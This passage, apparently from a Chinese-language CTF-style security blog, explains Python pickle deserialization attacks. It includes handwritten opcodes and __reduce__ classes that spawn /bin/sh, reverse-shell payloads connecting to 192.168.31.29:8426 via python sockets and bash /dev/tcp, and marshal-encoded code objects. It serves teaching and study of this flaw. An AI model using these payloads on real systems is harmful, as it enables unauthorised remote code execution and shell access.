&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">c&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span> &lt;span style="color:#d88200">&amp;#39;builtins exec&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">17&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">q&lt;/span> &lt;span style="color:#111">BINPUT&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">19&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">X&lt;/span> &lt;span style="color:#111">BINUNICODE&lt;/span> &lt;span style="color:#d88200">&amp;#34;key1=b&amp;#39;1&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">key2=b&amp;#39;2&amp;#39;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">43&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">q&lt;/span> &lt;span style="color:#111">BINPUT&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">45&lt;/span>&lt;span style="color:#111">:&lt;/span> \&lt;span style="color:#111">x85&lt;/span> &lt;span style="color:#111">TUPLE1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">46&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">q&lt;/span> &lt;span style="color:#111">BINPUT&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">48&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">R&lt;/span> &lt;span style="color:#111">REDUCE&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">49&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">q&lt;/span> &lt;span style="color:#111">BINPUT&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">51&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#111">STOP&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">highest&lt;/span> &lt;span style="color:#111">protocol&lt;/span> &lt;span style="color:#111">among&lt;/span> &lt;span style="color:#111">opcodes&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="å¯ä»¥åˆ©ç”¨çš„æ–¹å‘æ€è·¯">å¯ä»¥åˆ©ç”¨çš„æ–¹å‘&amp;amp;æ€è·¯&lt;/h2>
&lt;p>pickleçš„åº”ç”¨åœºæ™¯å…¶å®å¾ˆå¹¿æ³›&lt;/p>
&lt;ul>
&lt;li>è§£æè®¤è¯token, sessionæ—¶ï¼›å‚è§ï¼š&lt;a href="https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html">æŒé˜…iReaderæŸç«™Pythonæ¼æ´æŒ–æ˜&lt;/a>ï¼ˆä¸€ä¸ªredis+pythonååºåˆ—åŒ–çš„æ —å­&lt;/li>
&lt;li>å¯èƒ½å°†å¯¹è±¡pickleåå­˜å‚¨æˆç£ç›˜æ–‡ä»¶&lt;/li>
&lt;li>å¯èƒ½å°†å¯¹è±¡pickleååœ¨ç½‘ç»œä¸­ä¼ è¾“&lt;/li>
&lt;li>å¯èƒ½ä¼šé€šè¿‡å‚æ•°ä¼ é€’ç»™ç¨‹åºï¼›å‚è§ï¼š&lt;a href="https://blog.knownsec.com/2015/12/sqlmap-code-execution-vulnerability-analysis/">sqlmapçš„ä»£ç æ‰§è¡Œæ¼æ´&lt;/a>&lt;/li>
&lt;/ul>
&lt;p>è¿™é‡Œè¯´ä¸€ä¸‹ç¬¬ä¸€ç‚¹ï¼Œflaské…åˆredisåœ¨æœåŠ¡ç«¯å­˜å‚¨sessionï¼ˆä»¥pickleåºåˆ—åŒ–å½¢å¼è¿›è¡Œå­˜å‚¨ï¼‰ï¼Œå¦‚æœé€šè¿‡cookieè¿›è¡Œè¯·æ±‚session_idæ—¶ï¼Œsessionç§çš„å†…å®¹å°±ä¼šè¢«ååºåˆ—åŒ–ã€‚ç†è®ºä¸Šæ²¡é—®é¢˜ï¼Œä½†å¦‚æœå‡ºç°redisçš„æœªæˆæƒè®¿é—®ï¼Œå°±å¯ä»¥é€šè¿‡è‡ªå·±è®¾è®¡æ¶æ„çš„sessionï¼Œç„¶åå†è®¾ç½®cookieå»è¯·æ±‚sessionæ—¶ï¼Œæˆ‘ä»¬è‡ªå®šçš„å†…å®¹å°±ä¼šè¢«ååºåˆ—åŒ–ï¼Œè¾¾åˆ°äº†rceçš„ç›®çš„ã€‚&lt;/p>
&lt;p>æ„é€ ååºåˆ—åŒ–çš„payloadç¦»ä¸å¼€&lt;code>__reduce__&lt;/code>è¿™ä¸ªé­”æœ¯æ–¹æ³•ï¼ˆä¸Šæ–‡ç®€å•çš„æåˆ°è¿‡ï¼‰ï¼Œå®ƒæ˜¯æ–°å¼ç±»ï¼ˆå†…ç½®ç±»ï¼‰ç‰¹æœ‰çš„æ–¹æ³•ï¼ˆå…³äºæ›´å¤špythonå…ƒç±»ç›¸å…³çš„çŸ¥è¯†å¯ä»¥å‚è€ƒstackoverflowçš„è¿™ç¯‡å¸–å­ï¼š&lt;a href="https://stackoverflow.com/questions/100003/what-are-metaclasses-in-python">What are metaclasses in Python?&lt;/a>ï¼‰&lt;/p>
&lt;p>â€”â€”â€”â€”åœ¨python2æœ‰ä¸¤ç§å£°æ˜ç±»çš„æ–¹å¼ï¼Œå¹¶ä¸”å®ƒä»¬å®ä¾‹åŒ–çš„å¯¹è±¡æ€§è´¨æ˜¯ä¸åŒçš„&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809005621153.png" alt="image-20210809005621153">&lt;/p>
&lt;p>python3ä¸­æ¶ˆé™¤äº†ä¸¤è€…çš„åŒºåˆ«ï¼Œè¡¨ç°ä¸ºç¬¬äºŒç§&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809005849080.png" alt="image-20210809005849080">&lt;/p>
&lt;p>å›åˆ°å…³äº&lt;code>__reduce__&lt;/code>çš„é—®é¢˜ï¼Œåªè¦åœ¨æ–°å¼ç±»ä¸­å®šä¹‰ä¸€ä¸ª &lt;code>__reduce__&lt;/code> æ–¹æ³•ï¼Œæˆ‘ä»¬å°±èƒ½åœ¨åºåˆ—åŒ–çš„ä½¿ç”¨è®©è¿™ä¸ªç±»æ ¹æ®æˆ‘ä»¬åœ¨&lt;code>__reduce__&lt;/code> ä¸­æŒ‡å®šçš„æ–¹å¼è¿›è¡Œåºåˆ—åŒ–ã€‚æŒ‡å®šçš„å…³é”®å°±åœ¨äºè¯¥æ–¹æ³•çš„è¿”å›å€¼ä¸Šï¼šä¸€ä¸ª&lt;code>callable&lt;/code>å¯è°ƒç”¨çš„å¯¹è±¡ï¼Œä¸€ä¸ªæ˜¯&lt;code> ([para1, para2, ...])[, ...])&lt;/code>ï¼Œè¯¥å¯¹è±¡æ‰€éœ€çš„å‚æ•°å…ƒç»„ï¼›æœ€ç®€å•çš„ä¾‹å­æ˜¯&lt;code>return (os.system, ('ls',))&lt;/code>ã€‚&lt;code>__reduce__&lt;/code> æ–¹æ³•ä¸opcodeä¸­çš„RæŒ‡ä»¤ç å…³ç³»å¯†åˆ‡ï¼Œå¯ä»¥è¯´PVMçš„RæŒ‡ä»¤ç å°±æ˜¯&lt;code>__reduce__&lt;/code>çš„è¿”å›å€¼çš„ä¸€ä¸ªåº•å±‚å®ç°ã€‚&lt;/p>
&lt;h3 id="æ­¤å¤„ä¸Šä¸€ä¸ªç®€å•çš„å°æ —å­">æ­¤å¤„ä¸Šä¸€ä¸ªç®€å•çš„å°æ —å­&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># shell.pickle&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">cos&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">system&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">S&lt;/span>&lt;span style="color:#d88200">&amp;#39;/bin/sh&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">tR&lt;/span>&lt;span style="color:#f92672">.&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809002248690.png" alt="image-20210809002248690">&lt;/p>
&lt;p>ä¸Šé¢æ‰‹å†™çš„opcodeæˆåŠŸè¿”å›äº†shçš„shellï¼›è€Œé€šè¿‡dumpså’Œloadså®ç°åˆ™æ˜¯è¿™æ ·ï¼›æˆ‘ä»¬æ‰§è¡Œçš„ä»£ç éƒ½åœ¨&lt;code>__reduce__&lt;/code>ä¸­&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># py2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pickle&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">os&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">A&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">object&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">__reduce__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;/bin/sh&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">,(&lt;/span>&lt;span style="color:#111">a&lt;/span>&lt;span style="color:#111">,))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">A&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">test&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">a&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span> &lt;span style="color:#111">test&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">test&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809011024984.png" alt="image-20210809011024984">&lt;/p>
&lt;p>ä¹Ÿé¡ºåˆ©è¿”å›äº†shellï¼Œå¾ˆå®¹æ˜“å‘ç°è·Ÿä¸Šé¢æ‰‹å†™çš„opcodeå¹¶æ— å·®å¼‚ï¼Œè€Œè¿™ä¸ªæ ¸å¿ƒå°±æ˜¯æ„é€ æ—¶çš„&lt;code>__reduce__&lt;/code>å‡½æ•°çš„è¿”å›å€¼ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨å®ƒæ¥rceï¼Œåå¼¹shellä¹‹ç±»çš„ã€‚&lt;/p>
&lt;h3 id="å¦ä¸€ä¸ªåå¼¹shellçš„å°æ —å­">å¦ä¸€ä¸ªåå¼¹shellçš„å°æ —å­&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pickle&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">os&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">A&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">object&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">__reduce__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;python2 -c &amp;#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;#34;192.168.31.29&amp;#34;,8426));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&amp;#34;/bin/sh&amp;#34;,&amp;#34;-i&amp;#34;]);&amp;#39;&amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">,(&lt;/span>&lt;span style="color:#111">a&lt;/span>&lt;span style="color:#111">,))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">a&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">A&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">result&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">a&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">result&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># æˆ–è€…æœ€ç®€å•çš„æ‰‹å†™opcode ä¸ç”¨ç‰¹æ„æ„é€ class A()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">cos&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">system&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">S&lt;/span>&lt;span style="color:#d88200">&amp;#39;bash -c &amp;#34;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.31.29/8426 0&amp;gt;&amp;amp;1&amp;#34;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">tR&lt;/span>&lt;span style="color:#f92672">.&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809090941558.png" alt="image-20210809090941558">&lt;/p>
&lt;p>å‚è€ƒï¼š&lt;a href="https://www.k0rz3n.com/2018/08/05/Linux%E5%8F%8D%E5%BC%B9shell%EF%BC%88%E4%B8%80%EF%BC%89%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/">Linuxåå¼¹shellï¼ˆä¸€ï¼‰æ–‡ä»¶æè¿°ç¬¦ä¸é‡å®šå‘&lt;/a> | &lt;a href="https://www.k0rz3n.com/2018/08/05/Linux%20%E5%8F%8D%E5%BC%B9shell%20%EF%BC%88%E4%BA%8C%EF%BC%89%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E6%9C%AC%E8%B4%A8/">Linux åå¼¹shellï¼ˆäºŒï¼‰åå¼¹shellçš„æœ¬è´¨&lt;/a>&lt;/p>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
æ —å­1 - [DasCTF 0721] easyweb
&lt;/h4>
&lt;/summary>
&lt;p>&lt;a href="https://amiaaaz.github.io/2021/08/05/dasctf0721-wp/#easyweb">ä¹‹å‰å†™è¿‡äº†&lt;/a>ï¼Œåœ¨å¯¹sessionçš„å¤„ç†æ—¶ä½¿ç”¨äº†pickleï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ æ¶æ„çš„sessionåå¼¹shellï¼›ä¹Ÿæ²¡æœ‰ç‰¹æ®Šçš„è¿‡æ»¤å’Œé™åˆ¶ï¼Œpayloadæ€ä¹ˆå†™éƒ½è¡Œ&lt;/p>
&lt;/details>
&lt;h3 id="ç”¨marshalåºåˆ—åŒ–ä»»æ„ä»£ç å¯¹è±¡">ç”¨Marshalåºåˆ—åŒ–ä»»æ„ä»£ç å¯¹è±¡&lt;/h3>
&lt;p>å¦‚æœåªåœ¨&lt;code>__reduce__&lt;/code>ä¸­ç”¨&lt;code>-c&lt;/code>å‚æ•°æ‰§è¡Œä»£ç çš„è¯ï¼Œé‡åˆ°ä¸€äº›è‡ªå®šå‡½æ•° åœ¨æ ¼å¼ä¸Šå°±ä¼šæ¯”è¾ƒéº»çƒ¦&lt;/p>
&lt;p>å‰é¢æåˆ°pickleä¸èƒ½åºåˆ—åŒ–ä»£ç å¯¹è±¡ï¼Œæ¥ä¸ªå®ä¾‹&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># py2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pickle&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">foo&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">os&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">fib&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">&amp;lt;=&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">n&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">fib&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">fib&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">print&lt;/span> &lt;span style="color:#d88200">&amp;#39;fib(10)=&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">fib&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">10&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/bin/sh&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">foo&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">func_code&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809094914448.png" alt="image-20210809094914448">&lt;/p>
&lt;p>ä½†ä¹Ÿä¸æ˜¯ç»è·¯ä¸€æ¡ï¼Œ&lt;strong>Marshal&lt;/strong>å¯ä»¥è®©è¿™æ®µä»£ç åºåˆ—åŒ–&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># py2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">marshal&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">base64&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">foo&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">os&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">fib&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">&amp;lt;=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">n&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">fib&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">fib&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">print&lt;/span> &lt;span style="color:#d88200">&amp;#39;fib(10) =&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">fib&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">10&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/bin/sh&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">code_serialized&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">marshal&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">foo&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">func_code&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span> &lt;span style="color:#111">code_serialized&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># YwAAAAABAAAAAgAAAAMAAABzOwAAAGQBAGQAAGwAAH0AAIcAAGYBAGQCAIYAAIkAAGQDAEeIAABkBACDAQBHSHwAAGoBAGQFAIMBAAFkAABTKAYAAABOaf////9jAQAAAAEAAAAEAAAAEwAAAHMsAAAAfAAAZAEAawEAchAAfAAAU4gAAHwAAGQBABiDAQCIAAB8AABkAgAYgwEAF1MoAwAAAE5pAQAAAGkCAAAAKAAAAAAoAQAAAHQBAAAAbigBAAAAdAMAAABmaWIoAAAAAHMFAAAAdTIucHlSAQAAAAUAAABzBgAAAAABDAEEAXMIAAAAZmliKDEwKT1pCgAAAHMHAAAAL2Jpbi9zaCgCAAAAdAIAAABvc3QGAAAAc3lzdGVtKAEAAABSAgAAACgAAAAAKAEAAABSAQAAAHMFAAAAdTIucHl0AwAAAGZvbwMAAABzCAAAAAABDAEPBA8B&lt;/span>
